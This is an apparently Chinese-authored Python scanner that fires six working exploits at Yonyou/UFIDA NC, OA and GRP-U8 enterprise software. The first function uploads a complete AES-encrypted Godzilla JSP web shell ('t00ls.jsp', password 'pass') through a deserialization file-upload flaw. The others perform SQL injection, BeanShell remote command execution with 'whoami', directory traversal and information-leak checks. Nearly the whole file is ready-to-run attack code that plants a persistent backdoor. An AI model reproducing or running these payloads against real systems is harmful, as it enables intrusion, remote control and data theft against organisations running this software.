from modules import RequestsClass
from multiprocessing.dummy import Pool
from functools import partial
import re

def poc1(url):
	target = url + "/servlet/FileReceiveServlet"
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
		"Content-Type": "multipart/form-data;",
	}
	uploadData = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
	shellFlag='<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>'
	data = uploadData+shellFlag
	r = RequestsClass.Requests(url,target,data,headers)
	res1 = r.PostDatarequests()
	if res1 != False:
		if res1[0] == 200:
			res = str("[+]"+url+"/t00ls.jsp"+"\n"+"默认哥斯拉3.0配置，密码pass")
			return res
		else:
			res = str('[-] '+url+"  不存在上传漏洞！")
			return res
	else:
		res = str('[-] '+url+"  文件上传请求错误！")
		return res

def poc2(url):
	target = url +"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT user())"
	r =  RequestsClass.Requests(url,target)
	res2 = r.Getrequest()
	if res2 != False:
		if res2[0] == 200 and "序号" in res2[1]:
			match = re.search(r'<td align=left>(.*?)</td>',res2[1],re.I|re.M)
			if match:
				res = str("[+]"+url+"  test.jsp注入漏洞存在!"+"\n"+"为您查询到user(): "+"\n"+match[1])
				return res
			else:
				pass
		else:
			res = str('[-] '+url+"  不存在test.jsp注入漏洞!")
			return res
	else:
		res = str('[-] '+url+"  test.jsp注入漏洞请求错误!")
		return res

def poc3(url):
	target=url+"/servlet/~ic/bsh.servlet.BshServlet"
	headers={
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '60',
		'Connection': 'close',
	}
	data="bsh.script=exec%28%22whoami%22%29%3B%0D%0A%0D%0A%0D%0A%0D%0A"
	r = RequestsClass.Requests(url,target,data,headers)
	res3 = r.PostDatarequests()
	if res3 != False:
		if res3[0] == 200 and "BeanShell Test Servle" in res3[1]:
			res = str("[+]"+url+"  后门rce漏洞存在!"+"\n"+"exp: /servlet/~ic/bsh.servlet.BshServlet")
			return res
		else:
			res = str('[-] '+url+"  不存在后门rce漏洞！")
			return res
	else:
		res = str('[-] '+url+"  后门rce请求错误！")
		return res

def poc4(url):
	target=url+"/NCFindWeb?service=IPreAlertConfigService&filename="
	r = RequestsClass.Requests(url,target)
	res4 = r.Getrequest()
	if res4 != False:
		if res4[0] == 200 and "Tree.js" in res4[1]:
			res = str("[+]"+url+"  UFIDA目录遍历漏洞存在！"+"\n"+"exp: /NCFindWeb?service=IPreAlertConfigService&filename=")
			return res
		else:
			res = str('[-] '+url+"  不存在UFIDA目录遍历漏洞！")
			return res
	else:
		res = str('[-] '+url+"  UFIDA目录遍历请求错误！")
		return res

def poc5(url):
	target = url+"/Proxy"
	headers = {
		"Content-Type": "application/x-www-form-urlencoded"
	}
	data = """
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
	"""
	r = RequestsClass.Requests(url,target,data,headers)
	res5 = r.Getrequest()
	if res5 != False:
		if '<ROW COLUMN1="1"' in res5[1] and "服务器错误信息：null" not in res5[1]:
			match = re.findall(r'COLUMN5="(.*?)"',res5[1])[0]
			res = str("[+]"+url+"  用友GRP-U8 SQL注入漏洞存在！"+"\n"+"注入获取版本为："+"\n"+match)
			return res
		else:
			res = str('[-] '+url+"  不存在用友GRP-U8 SQL注入漏洞！")
			return res
	else:
		res = str('[-] '+url+"  用友GRP-U8 SQL注入漏洞请求错误！")
		return res

def poc6(url):
	target = url+"/yyoa/common/selectPersonNew/initData.jsp?trueName=1"
	r = RequestsClass.Requests(url,target)
	res6 = r.Getrequest()
	if res6 != False:
		if res6[0] == 200 and "personList" in res6[1]:
			res = str("[+]"+url+"  用友NC 信息泄露漏洞存在！"+"\n"+"exp: /yyoa/common/selectPersonNew/initData.jsp?trueName=1")
			return res
		else:
			res = str('[-] '+url+"  不存在用友NC 信息泄露漏洞！")
			return res
	else:
		res = str('[-] '+url+"  用友NC 信息泄露漏洞请求错误！")
		return res

def runall(name,url):
	if name == 'poc1':
		r1 = poc1(url)
		return r1
	elif name == 'poc2':
		r2 = poc2(url)
		return r2
	elif name == 'poc3':
		r3 = poc3(url)
		return r3
	elif name == 'poc4':
		r4 = poc4(url)
		return r4
	elif name == 'poc5':
		r5 = poc5(url)
		return r5
	elif name == 'poc6':
		r6 = poc6(url)
		return r6

def run(url):
	list1 = ['poc1','poc2','poc3','poc4','poc5','poc6']
	pool = Pool(processes=50)
	func = partial(runall,url=url)
	res = pool.map(func,list1)
	pool.close()
	return res


